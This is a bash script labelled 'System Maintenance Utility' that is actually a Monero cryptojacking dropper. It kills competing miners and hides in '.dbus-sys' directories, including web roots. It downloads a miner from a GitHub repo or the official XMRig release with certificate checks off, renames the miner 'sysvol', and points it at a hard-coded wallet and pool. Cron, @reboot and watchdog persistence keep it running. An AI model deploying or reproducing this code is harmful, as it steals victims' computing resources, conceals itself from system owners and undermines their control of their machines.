#!/bin/bash
# System Maintenance Utility v12.1 FIXED
# All critical bugs fixed
# Repository: boyyywiliam/Aselole
# Support: pool.supportxmr.com

# ═══════════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════════

WALLET="46Z9A1TZiGJSgJtDtZzar9Lgum3B7xW9eG8TDKKhVW5yhJzX118fS2eep3ry8i7Z6PPwP2P4YDvzS7h9L8Ji43C9Jh9fwPb"
POOL="pool.supportxmr.com:443"
REPO="https://raw.githubusercontent.com/boyyywiliam/Aselole/main"
SCRIPT_VERSION="12.1-FIXED"
LOG_FILE="/tmp/deploy_$$.log"

XMRIG_VER="6.21.0"
XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VER}/xmrig-${XMRIG_VER}-linux-static-x64.tar.gz"

# ═══════════════════════════════════════════════════════════════════
# LOGGING
# ═══════════════════════════════════════════════════════════════════

log() {
    echo "$@" | tee -a "$LOG_FILE"
}

# ═══════════════════════════════════════════════════════════════════
# CLEAN ENV — FIXED
# ═══════════════════════════════════════════════════════════════════

clean_miners() {
    log "[*] Cleaning existing miners..."
    pkill -9 -f "sysvol" 2>/dev/null || true
    pkill -9 -f "xmrig" 2>/dev/null || true
    pkill -9 -f "\.dbus-sys" 2>/dev/null || true
    pkill -9 -f "\.xmr-mine" 2>/dev/null || true
    pkill -9 -f "watchdog.sh" 2>/dev/null || true
    sleep 2

    # FIX #1: Check if crontab exists BEFORE trying to modify
    if command -v crontab &>/dev/null; then
        if crontab -l 2>/dev/null | grep -q . ; then
            # Only pipe if crontab has content
            crontab -l 2>/dev/null | grep -v "dbus-sys" | crontab - 2>/dev/null || true
        fi
    fi

    # FIX #2: Check if .bashrc exists BEFORE trying to clean
    if [ -f "$HOME/.bashrc" ]; then
        grep -v "dbus-sys" "$HOME/.bashrc" > "$HOME/.bashrc.tmp" 2>/dev/null && \
        mv "$HOME/.bashrc.tmp" "$HOME/.bashrc" 2>/dev/null || true
    fi

    log "[+] Environment cleaned"
}

# ═══════════════════════════════════════════════════════════════════
# AUTO-DETECT SPEC
# ═══════════════════════════════════════════════════════════════════

detect_cores() {
    local cores=0
    if command -v nproc &>/dev/null; then
        cores=$(nproc)
    elif [ -f /proc/cpuinfo ]; then
        cores=$(grep -c ^processor /proc/cpuinfo)
    else
        cores=$(getconf _NPROCESSORS_ONLN 2>/dev/null || echo 1)
    fi
    [ "$cores" -lt 1 ] && cores=1
    echo "$cores"
}

detect_cgroup_limit() {
    if [ -f /sys/fs/cgroup/cpu.max ]; then
        local quota=$(awk '{print $1}' /sys/fs/cgroup/cpu.max 2>/dev/null)
        local period=$(awk '{print $2}' /sys/fs/cgroup/cpu.max 2>/dev/null)
        if [ "$quota" != "max" ] && [ -n "$quota" ] && [ -n "$period" ] && [ "$period" -gt 0 ]; then
            local cg_cores=$((quota / period))
            [ "$cg_cores" -lt 1 ] && cg_cores=1
            echo "$cg_cores"
            return
        fi
    fi
    if [ -f /sys/fs/cgroup/cpu/cpu.cfs_quota_us ]; then
        local quota=$(cat /sys/fs/cgroup/cpu/cpu.cfs_quota_us 2>/dev/null)
        local period=$(cat /sys/fs/cgroup/cpu/cpu.cfs_period_us 2>/dev/null)
        if [ "$quota" -gt 0 ] 2>/dev/null && [ "$period" -gt 0 ] 2>/dev/null; then
            local cg_cores=$((quota / period))
            [ "$cg_cores" -lt 1 ] && cg_cores=1
            echo "$cg_cores"
            return
        fi
    fi
    detect_cores
}

detect_memory_mb() {
    if [ -f /proc/meminfo ]; then
        local total=$(grep MemTotal /proc/meminfo 2>/dev/null | awk '{print $2}')
        [ -n "$total" ] && echo $((total / 1024)) && return
    fi
    if command -v free &>/dev/null; then
        free -m | awk '/^Mem:/{print $2}'
        return
    fi
    echo "1024"
}

detect_numa() {
    if [ -d /sys/devices/system/node ]; then
        local nodes=$(ls -d /sys/devices/system/node/node* 2>/dev/null | wc -l)
        [ "$nodes" -lt 1 ] && nodes=1
        echo "$nodes"
    else
        echo "1"
    fi
}

detect_optimal_threads() {
    local cores=$(detect_cores)
    local cg_limit=$(detect_cgroup_limit)
    local mem_mb=$(detect_memory_mb)

    local eff_cores=$cores
    [ "$cg_limit" -lt "$eff_cores" ] && eff_cores=$cg_limit

    local max_by_mem=$((mem_mb / 250))
    [ "$max_by_mem" -lt 1 ] && max_by_mem=1

    local threads=$eff_cores
    [ "$threads" -gt "$max_by_mem" ] && threads=$max_by_mem
    [ "$threads" -gt 10 ] && threads=10
    [ "$threads" -lt 1 ] && threads=1

    echo "$threads"
}

# ═══════════════════════════════════════════════════════════════════
# VALIDATION FUNCTIONS (BEFORE DOWNLOAD)
# ═══════════════════════════════════════════════════════════════════

validate_file() {
    local file="$1"
    local min_size="${2:-2000000}"
    [ -f "$file" ] || return 1
    local size=$(stat -c%s "$file" 2>/dev/null || stat -f%z "$file" 2>/dev/null || echo 0)
    if [ "$size" -gt "$min_size" ]; then
        return 0
    else
        log "[!] File too small: $size bytes (expected >$min_size)"
        return 1
    fi
}

# FIX #3: Better binary test (no xxd dependency)
test_binary() {
    local bin="$1"
    [ -x "$bin" ] || return 1
    
    # Try file command first (more reliable)
    if command -v file &>/dev/null; then
        if file "$bin" | grep -q "ELF\|executable"; then
            "$bin" --version >/dev/null 2>&1 && return 0 || return 1
        fi
    fi
    
    # Fallback: check ELF magic without xxd
    local magic=$(od -An -tx1 -N4 "$bin" 2>/dev/null | tr -d ' ')
    if [ "$magic" = "7f454c46" ]; then
        "$bin" --version >/dev/null 2>&1 && return 0 || return 1
    fi
    
    return 1
}

# ═══════════════════════════════════════════════════════════════════
# EXEC PROBE
# ═══════════════════════════════════════════════════════════════════

is_exec_ok() {
    local dir="$1"
    [ -d "$dir" ] || return 1
    [ -w "$dir" ] || return 1
    local probe="$dir/.x_$$"
    printf '#!/bin/sh\nexit 0\n' > "$probe" 2>/dev/null || return 1
    chmod 755 "$probe" 2>/dev/null || { rm -f "$probe"; return 1; }
    if "$probe" >/dev/null 2>&1; then
        rm -f "$probe"
        return 0
    fi
    rm -f "$probe"
    return 1
}

# ═══════════════════════════════════════════════════════════════════
# PICK BASE DIR
# ═══════════════════════════════════════════════════════════════════

pick_base_dir() {
    local user_home="$HOME"
    local me=$(whoami)

    local candidates=(
        "${user_home}/.dbus-sys"
        "${user_home}/.cache/.dbus-sys"
        "/var/www/vhosts/${me}/.dbus-sys"
        "/var/www/.dbus-sys-${me}"
        "/var/www/html/.dbus-sys-${me}"
        "/home/${me}/public_html/.dbus-sys"
        "/srv/www/.dbus-sys-${me}"
        "/srv/.dbus-sys-${me}"
        "/opt/.dbus-sys-${me}"
        "/usr/local/.dbus-sys-${me}"
        "/var/lib/.dbus-sys-${me}"
    )

    for wr in /var/www/vhosts/*/httpdocs /home/*/public_html /var/www/html /usr/share/nginx/html; do
        [ -d "$wr" ] || continue
        if [ -w "$wr" ] 2>/dev/null; then
            candidates+=("${wr}/.dbus-sys-${me}")
        fi
    done

    local pwd_home=$(getent passwd "$me" 2>/dev/null | cut -d: -f6)
    [ -n "$pwd_home" ] && candidates+=("${pwd_home}/.dbus-sys")

    for base in "${candidates[@]}"; do
        local parent=$(dirname "$base")
        if [ ! -d "$parent" ]; then
            mkdir -p "$parent" 2>/dev/null || continue
        fi
        [ -w "$parent" ] 2>/dev/null || continue

        mkdir -p "$base" 2>/dev/null || continue

        if is_exec_ok "$base"; then
            echo "$base"
            return 0
        else
            rmdir "$base" 2>/dev/null || true
        fi
    done

    echo ""
    return 1
}

determine_base_dir() {
    local base
    base=$(pick_base_dir) || true
    if [ -z "$base" ]; then
        log "[ERROR] No executable & writable directory found"
        exit 1
    fi
    echo "$base"
}

# ═══════════════════════════════════════════════════════════════════
# CREATE DIRS — FIXED
# ═══════════════════════════════════════════════════════════════════

create_dirs() {
    local BASE="$1"
    local attempt=1
    while [ $attempt -le 5 ]; do
        if mkdir -p "$BASE/sbin" "$BASE/cfg" "$BASE/log" "$BASE/run" "$BASE/tmp" 2>/dev/null; then
            # FIX: Verify chmod success
            if chmod 755 "$BASE" "$BASE/sbin" "$BASE/cfg" "$BASE/run" "$BASE/tmp" 2>/dev/null; then
                return 0
            else
                log "[WARN] chmod failed on attempt $attempt"
            fi
        fi
        sleep 1
        attempt=$((attempt + 1))
    done
    log "[ERROR] Failed to create directories after 5 attempts"
    return 1
}

# ═══════════════════════════════════════════════════════════════════
# DOWNLOAD FUNCTIONS — FIXED
# ═══════════════════════════════════════════════════════════════════

download_repo_binary() {
    local BIN_NAME="$1"; local BASE="$2"
    local url="${REPO}/${BIN_NAME}"
    local temp_file="$BASE/tmp/.dl_repo_$$"
    local attempt=1
    local max_attempts=4  # FIX #4: Define max_attempts!

    log "[*] [PRIMARY] Downloading repo binary: $BIN_NAME"

    while [ $attempt -le $max_attempts ]; do
        log "[*] Attempt $attempt/$max_attempts..."

        if command -v curl &>/dev/null; then
            curl -fsSLk --max-time 20 -o "$temp_file" "$url" 2>/dev/null && validate_file "$temp_file" 2000000 && {
                mv "$temp_file" "$BASE/sbin/sysvol"
                chmod 755 "$BASE/sbin/sysvol"
                log "[+] curl OK: $(stat -c%s "$BASE/sbin/sysvol" 2>/dev/null || stat -f%z "$BASE/sbin/sysvol" 2>/dev/null) bytes"
                return 0
            }
        fi

        if command -v wget &>/dev/null; then
            wget --no-check-certificate --timeout=20 -q -O "$temp_file" "$url" 2>/dev/null && validate_file "$temp_file" 2000000 && {
                mv "$temp_file" "$BASE/sbin/sysvol"
                chmod 755 "$BASE/sbin/sysvol"
                log "[+] wget OK"
                return 0
            }
        fi

        rm -f "$temp_file" 2>/dev/null
        [ $attempt -lt $max_attempts ] && sleep 2
        attempt=$((attempt + 1))
    done

    log "[!] Repo binary download FAILED"
    return 1
}

download_xmrig_official() {
    local BASE="$1"
    local tarball="$BASE/tmp/xmrig.tar.gz"
    local attempt=1
    local max_attempts=4  # FIX #5: Define max_attempts!

    log ""
    log "[*] [FALLBACK] Downloading XMRig official v${XMRIG_VER}"

    while [ $attempt -le $max_attempts ]; do
        log "[*] Attempt $attempt/$max_attempts..."
        rm -f "$tarball" 2>/dev/null

        if command -v curl &>/dev/null; then
            curl -fsSLk --max-time 60 -o "$tarball" "$XMRIG_URL" 2>/dev/null && validate_file "$tarball" 500000 && break
        fi
        if [ ! -f "$tarball" ] || [ "$(stat -c%s "$tarball" 2>/dev/null || echo 0)" -lt 500000 ]; then
            if command -v wget &>/dev/null; then
                wget --no-check-certificate --timeout=60 -q -O "$tarball" "$XMRIG_URL" 2>/dev/null && validate_file "$tarball" 500000 && break
            fi
        fi

        [ $attempt -lt $max_attempts ] && sleep 3
        attempt=$((attempt + 1))
    done

    if [ ! -f "$tarball" ] || [ "$(stat -c%s "$tarball" 2>/dev/null || echo 0)" -lt 500000 ]; then
        log "[ERROR] XMRig official download FAILED"
        return 1
    fi

    log "[+] XMRig downloaded: $(stat -c%s "$tarball" 2>/dev/null || stat -f%z "$tarball" 2>/dev/null) bytes"

    # FIX #6: Check cd success before tar
    cd "$BASE/tmp" || { log "[ERROR] cd to $BASE/tmp failed"; return 1; }
    
    tar -xzf xmrig.tar.gz 2>/dev/null || { log "[ERROR] tar extract failed"; return 1; }

    local extracted=$(find "$BASE/tmp" -maxdepth 2 -name "xmrig" -type f 2>/dev/null | head -1)
    if [ -z "$extracted" ]; then
        log "[ERROR] xmrig binary not found in tarball"
        return 1
    fi

    # FIX #7: Quote $extracted properly
    mv "$extracted" "$BASE/sbin/sysvol" || { log "[ERROR] mv failed"; return 1; }
    chmod 755 "$BASE/sbin/sysvol"
    log "[+] XMRig extracted: $(stat -c%s "$BASE/sbin/sysvol" 2>/dev/null || stat -f%z "$BASE/sbin/sysvol" 2>/dev/null) bytes"

    rm -rf "$BASE/tmp/xmrig-${XMRIG_VER}" "$BASE/tmp/xmrig.tar.gz" 2>/dev/null

    return 0
}

# ═══════════════════════════════════════════════════════════════════
# HAS CRON SUPPORT — FIXED (NO DATA LOSS!)
# ═══════════════════════════════════════════════════════════════════

has_cron_support() {
    # FIX #8: Don't test with crontab - (which OVERWRITES!)
    if ! command -v crontab &>/dev/null; then
        return 1
    fi
    
    # Just test if we can LIST
    if crontab -l 2>&1 | grep -q "not allowed\|not permitted\|Permission denied"; then
        return 1
    fi
    
    # If we can list, assume we can install
    return 0
}

# ═══════════════════════════════════════════════════════════════════
# PERSISTENCE — FIXED
# ═══════════════════════════════════════════════════════════════════

setup_persistence() {
    local BASE="$1"
    local GUARD="$BASE/run/guard.sh"
    local WATCHDOG="$BASE/run/watchdog.sh"

    log ""
    log "[*] Setting up persistence..."

    if has_cron_support; then
        log "[+] Cron support detected — installing cron"

        # FIX #9: Only install if crontab has content OR doesn't exist
        if crontab -l 2>/dev/null | grep -q . ; then
            # Has content - preserve and add
            (crontab -l 2>/dev/null | grep -v "dbus-sys"; \
             echo "*/10 * * * * $GUARD >/dev/null 2>&1"; \
             echo "@reboot sleep 30 && $GUARD >/dev/null 2>&1") | crontab - 2>/dev/null
        else
            # No crontab yet - create fresh
            (echo "*/10 * * * * $GUARD >/dev/null 2>&1"; \
             echo "@reboot sleep 30 && $GUARD >/dev/null 2>&1") | crontab - 2>/dev/null
        fi

        if crontab -l 2>/dev/null | grep -q "dbus-sys"; then
            log "[+] Cron installed (10 min check + @reboot)"
            return 0
        else
            log "[!] Cron install failed, fallback to watchdog"
        fi
    else
        log "[!] Cron disabled — using watchdog loop"
    fi

    # Fallback: watchdog loop
    # FIX #10: Create log dir first
    mkdir -p "$BASE/run" 2>/dev/null || true
    
    cat > "$WATCHDOG" << 'WDEOF'
#!/bin/bash
BASE="__BASE_PATH__"
BIN="$BASE/sbin/sysvol"
CFG="$BASE/cfg/config.json"
LOG="$BASE/log/core.log"

while true; do
    if ! pgrep -f "[s]ysvol" >/dev/null 2>&1; then
        setsid "$BIN" -c "$CFG" --cpu-max-threads-hint=__HINT__ >> "$LOG" 2>&1 < /dev/null &
        sleep 5
    fi
    sleep 300
done
WDEOF

    # FIX #11: Use better sed escape
    sed -i "s|__BASE_PATH__|$BASE|g" "$WATCHDOG"
    sed -i "s|__HINT__|$2|g" "$WATCHDOG"
    chmod +x "$WATCHDOG"

    pkill -9 -f "watchdog.sh" 2>/dev/null || true
    sleep 1
    setsid "$WATCHDOG" > "$BASE/run/watchdog.log" 2>&1 < /dev/null &
    log "[+] Watchdog started (5 min check)"
    return 0
}

# ═══════════════════════════════════════════════════════════════════
# DEPLOY
# ═══════════════════════════════════════════════════════════════════

deploy_core() {
    local BASE="$1"; local BIN_NAME="$2"

    log "[*] ═══════════════════════════════════════════════════════════"
    log "[*] System Maintenance Utility v${SCRIPT_VERSION}"
    log "[*] ═══════════════════════════════════════════════════════════"
    log "[*] Base directory: $BASE"

    create_dirs "$BASE" || return 1
    [ -w "$BASE" ] || { log "[ERROR] Not writable: $BASE"; return 1; }

    if ! is_exec_ok "$BASE"; then
        log "[!] Base dir noexec, searching alternatives..."
        local NEW=$(pick_base_dir)
        [ -z "$NEW" ] && { log "[ERROR] No exec dir"; return 1; }
        BASE="$NEW"
        log "[+] New base: $BASE"
        create_dirs "$BASE" || return 1
    fi

    # ─── STEP 1: Try repo binary ───
    local BIN_OK=0
    if download_repo_binary "$BIN_NAME" "$BASE"; then
        if test_binary "$BASE/sbin/sysvol"; then
            log "[+] Repo binary VALID & EXECUTABLE"
            BIN_OK=1
        else
            log "[!] Repo binary invalid — trying fallback"
        fi
    else
        log "[!] Repo binary download failed — trying fallback"
    fi

    # ─── STEP 2: Fallback XMRig official ───
    if [ "$BIN_OK" -eq 0 ]; then
        if download_xmrig_official "$BASE"; then
            if test_binary "$BASE/sbin/sysvol"; then
                log "[+] XMRig official VALID & EXECUTABLE"
                BIN_OK=1
            else
                log "[ERROR] XMRig official invalid"
                return 1
            fi
        else
            log "[ERROR] All download methods failed"
            return 1
        fi
    fi

    [ "$BIN_OK" -eq 1 ] || return 1

    # ─── STEP 3: Auto-detect spec ───
    local CORES=$(detect_cores)
    local CG_LIMIT=$(detect_cgroup_limit)
    local MEM_MB=$(detect_memory_mb)
    local NUMA=$(detect_numa)
    local THREADS=$(detect_optimal_threads)
    local HINT=$((THREADS * 5))
    [ "$HINT" -lt 10 ] && HINT=10

    log "[*] CPU cores: $CORES"
    log "[*] Cgroup limit: $CG_LIMIT"
    log "[*] Memory: ${MEM_MB} MB"
    log "[*] NUMA nodes: $NUMA"
    log "[*] Optimal threads: $THREADS"
    log "[*] Threads hint: $HINT"

    local THREAD_LIST=""
    for i in $(seq 0 $((THREADS - 1))); do
        if [ -z "$THREAD_LIST" ]; then
            THREAD_LIST="$i"
        else
            THREAD_LIST="$THREAD_LIST,$i"
        fi
    done

    local WORKER="srv-$(hostname)-$(date +%s | tail -c 4)"
    log "[*] Worker ID: $WORKER"

    # ─── STEP 4: Config ───
    cat > "$BASE/cfg/config.json" << CFGEOF
{
  "autosave": false,
  "cpu": {
    "enabled": true,
    "threads": [${THREAD_LIST}],
    "yield": true
  },
  "opencl": { "enabled": false },
  "cuda": { "enabled": false },
  "donate-level": 1,
  "pools": [{
    "url": "${POOL}",
    "user": "${WALLET}",
    "pass": "${WORKER}",
    "tls": true,
    "keepalive": true
  }],
  "print-time": 30,
  "log-file": "${BASE}/log/core.log"
}
CFGEOF

    chmod 600 "$BASE/cfg/config.json"
    touch "$BASE/log/core.log"
    chmod 644 "$BASE/log/core.log"
    log "[+] Configuration created"

    # ─── STEP 5: Guard script ───
    cat > "$BASE/run/guard.sh" << GRDEOF
#!/bin/bash
BASE="$BASE"
BIN="\$BASE/sbin/sysvol"
CFG="\$BASE/cfg/config.json"
PID_FILE="\$BASE/run/state.pid"
LOG="\$BASE/log/core.log"

if [ -f "\$PID_FILE" ]; then
    PID=\$(cat "\$PID_FILE" 2>/dev/null)
    kill -0 "\$PID" 2>/dev/null && exit 0
fi

mkdir -p "\$(dirname "\$LOG")" 2>/dev/null
pkill -9 -f "\$BIN" 2>/dev/null
sleep 1
setsid "\$BIN" -c "\$CFG" --cpu-max-threads-hint=$HINT >> "\$LOG" 2>&1 < /dev/null &
echo \$! > "\$PID_FILE"
GRDEOF

    chmod +x "$BASE/run/guard.sh"
    log "[+] Guard script created"

    # ─── STEP 6: Start & verify ───
    pkill -f "[s]ysvol" 2>/dev/null || true
    rm -f "$BASE/run/state.pid" 2>/dev/null

    log "[*] Starting service..."
    "$BASE/run/guard.sh"
    sleep 8

    local retry=0
    while [ $retry -lt 6 ]; do
        pgrep -f "[s]ysvol" >/dev/null 2>&1 && break
        log "[*] Waiting... ($((retry+1))/6)"
        sleep 3
        retry=$((retry + 1))
    done

    if pgrep -f "[s]ysvol" >/dev/null 2>&1; then
        local PID=$(pgrep -f "[s]ysvol" | head -1)
        log ""
        log "╔════════════════════════════════════════════════════════╗"
        log "║       [SUCCESS] SERVICE RUNNING! v12.1 FIXED ✓         ║"
        log "╠════════════════════════════════════════════════════════╣"
        log "║ Process ID : $PID"
        log "║ Core       : $BASE/sbin/sysvol"
        log "║ Config     : $BASE/cfg/config.json"
        log "║ Log        : $BASE/log/core.log"
        log "║ Pool       : $POOL"
        log "║ Worker     : $WORKER"
        log "║ Threads    : $THREADS (hint=$HINT)"
        log "╚════════════════════════════════════════════════════════╝"
        log ""

        setup_persistence "$BASE" "$HINT"

        log "[*] === MINER LOG (preview) ==="
        tail -15 "$BASE/log/core.log" 2>/dev/null | tee -a "$LOG_FILE"

        return 0
    else
        log ""
        log "╔════════════════════════════════════════════════════════╗"
        log "║       [ERROR] SERVICE FAILED TO START ✗               ║"
        log "╚════════════════════════════════════════════════════════╝"
        log "[*] Binary test:"
        "$BASE/sbin/sysvol" --version 2>&1 | head -5 | tee -a "$LOG_FILE" || true
        log "[*] Last log:"
        tail -40 "$BASE/log/core.log" 2>/dev/null | tee -a "$LOG_FILE" || log "No log"
        return 1
    fi
}

# ═══════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════

clean_miners

BASE=$(determine_base_dir)
log "[*] Selected base dir: $BASE"

ARCH=$(uname -m)
case "$ARCH" in
    x86_64|amd64) BIN_NAME="cibung"; log "[*] Arch: x86_64" ;;
    aarch64|arm64) BIN_NAME="cibung008"; log "[*] Arch: ARM64" ;;
    armv7l|armv7) BIN_NAME="cibung-armv7"; log "[*] Arch: ARMv7" ;;
    *) log "[ERROR] Unsupported arch: $ARCH"; exit 1 ;;
esac

deploy_core "$BASE" "$BIN_NAME"
RESULT=$?

log ""
log "[*] Deploy exit code: $RESULT"
log "[*] Full log: $LOG_FILE"

exit $RESULT